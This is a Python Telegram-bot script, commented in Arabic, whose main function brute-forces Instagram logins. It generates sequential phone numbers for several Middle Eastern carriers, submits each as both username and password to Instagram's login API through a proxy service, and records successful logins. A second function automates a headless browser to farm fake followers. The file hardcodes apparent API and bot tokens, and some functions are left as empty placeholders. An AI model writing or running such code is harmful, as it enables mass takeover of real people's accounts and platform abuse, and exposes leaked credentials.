# ==============================================================================
#  MAHDI'S TOOLBOX - v6.0 (Headless Ghost Browser Edition)
# ==============================================================================
import os
import requests
import random
import time
import threading
import json
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from bs4 import BeautifulSoup
import re

# --- استيراد مكتبات المتصفح الشبح ---
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- إعدادات أساسية ---
TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U"
CHAT_ID = "1148797883"
# لم نعد بحاجة لـ ScraperAPI في أداة الرشق، ولكن سنبقيه لأداة الفحص
SCRAPER_API_KEY = "da54f75953fed511420acb3003111fa0"

# ... (كل متغيرات الحالة العامة تبقى كما هي) ...
current_task = "idle"
is_running = False
hits = 0
fails = 0
last_event = "Toolbox is idle."
start_time = None
current_target = "None"
network_map = {
    '1': ("Asia (Iraq)", "964", "077"), '2': ("Zain (Iraq)", "964", "078"),
    '3': ("Libya (091)", "218", "91"), '4': ("Libya (092)", "218", "92"),
    '5': ("MCI (Iran)", "98", "91"), '6': ("Irancell (Iran)", "98", "93"),
    '7': ("Vodafone (Egypt)", "20", "10"), '8': ("Orange (Egypt)", "20", "12"),
    '9': ("Ooredoo (Kuwait)", "965", "6"), '10': ("Vodafone (Qatar)", "974", "77")
}
current_hunter_config = {}
hunter_progress = {}

# --- إعدادات Flask (تبقى كما هي) ---
app = Flask(__name__)
@app.route('/')
def home():
    return "Toolbox bot is alive!"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

# --- أداة فحص الحسابات (تبقى كما هي) ---
def hunter_worker():
    # ... (هذا الجزء لم يتغير)
    global hits, fails, last_event
    country_code = current_hunter_config["country"]
    prefix = current_hunter_config["prefix"]
    network_key = current_hunter_config["key"]
    
    while is_running:
        current_num = hunter_progress.get(network_key, 0)
        hunter_progress[network_key] = current_num + 1
        save_hunter_progress()
        
        phone_suffix = str(current_num).zfill(7)
        username = f"{country_code}{prefix}{phone_suffix}"
        password = f"{prefix}{phone_suffix}"
        
        try:
            target_url = 'https://i.instagram.com/api/v1/accounts/login/'
            payload = {
                'api_key': SCRAPER_API_KEY,
                'url': target_url,
                'method': 'POST',
                'body': f'username={username}&password={password}&queryParams=%7B%7D&optIntoOneTap=false',
                'headers': {
                    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G935F; hero2lte; samsungexynos8890; en_US)',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            }
            response = requests.post('http://api.scraperapi.com', json=payload, timeout=90)

            if 'logged_in_user' in response.text:
                hits += 1
                last_event = f"🎯 HIT! @{username}"
            else:
                fails += 1
                last_event = f"Checked @{username}"
        except Exception as e:
            fails += 1
            last_event = f"Hunter Error: {e}"
        
        time.sleep(2)

# --- أداة رشق المتابعين (نسخة المتصفح الشبح) ---
def setup_ghost_browser():
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920x1080")
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    
    # هذا السطر مهم جداً ليجد Selenium متصفح Chrome الذي قمنا بتثبيته
    options.binary_location = "/usr/bin/google-chrome-stable"
    
    # لا نحتاج لـ chromedriver_autoinstaller لأننا نستخدم النسخة المثبتة مع النظام
    service = ChromeService()
    driver = webdriver.Chrome(service=service, options=options)
    return driver

def rusher_worker(target_username):
    global hits, fails, last_event
    while is_running:
        driver = None
        try:
            last_event = "🚀 Launching Ghost Browser..."
            driver = setup_ghost_browser()
            
            page_url = "https://superviral.io/free-instagram-followers/"
            driver.get(page_url)
            
            last_event = "Waiting for page to load..."
            # انتظر بذكاء حتى يظهر حقل اسم المستخدم (بحد أقصى 30 ثانية)
            wait = WebDriverWait(driver, 30)
            username_input = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='username']")))
            
            last_event = "Page loaded. Filling form..."
            email_input = driver.find_element(By.CSS_SELECTOR, "input[name='email']")
            submit_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            
            random_email = f"user{random.randint(10000, 99999)}@example.com"
            
            username_input.send_keys(target_username)
            email_input.send_keys(random_email)
            
            last_event = f"Submitting for @{target_username}..."
            submit_button.click()
            
            last_event = "Waiting for result..."
            # انتظر ظهور رسالة النجاح أو الفشل
            result_message = wait.until(EC.presence_of_element_located((By.ID, "get-followers-result")))
            
            if "success" in result_message.get_attribute("class"):
                hits += 1
                last_event = f"✅ Success! Followers sent to @{target_username}."
            else:
                fails += 1
                # حاول قراءة رسالة الخطأ من الصفحة
                error_text = result_message.text
                last_event = f"❌ Failed: {error_text}"

            # انتظر فترة طويلة قبل المحاولة التالية لتجنب الحظر
            time.sleep(600) # 10 دقائق

        except Exception as e:
            fails += 1
            last_event = f"Rusher Error: {str(e).splitlines()[0]}" # رسالة خطأ مختصرة
            time.sleep(10)
        finally:
            if driver:
                driver.quit() # تأكد من إغلاق المتصفح دائماً

# ... (باقي دوال البوت والمدير العام تبقى كما هي تماماً) ...
# ... (start_command, stop_command, status_command, button_handler, message_handler) ...

def main_task_manager(task_type, target):
    # ... (هذا الجزء لم يتغير)
    global is_running, start_time, current_target, hits, fails, last_event, current_task, current_hunter_config
    
    is_running = True
    current_task = task_type
    start_time = time.time()
    current_target = target
    hits, fails = 0, 0
    worker_threads = []

    if task_type == "hunting":
        # ...
    elif task_type == "rushing":
        # ملاحظة: سنستخدم خيطاً واحداً فقط لأن كل خيط يستهلك الكثير من الموارد
        worker_threads = [threading.Thread(target=rusher_worker, args=(target,))]
    
    for t in worker_threads: t.start()

# --- دالة التشغيل الرئيسية للبوت ---
def run_bot():
    # ... (هذا الجزء لم يتغير)

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask); flask_thread.daemon = True; flask_thread.start()
    run_bot()
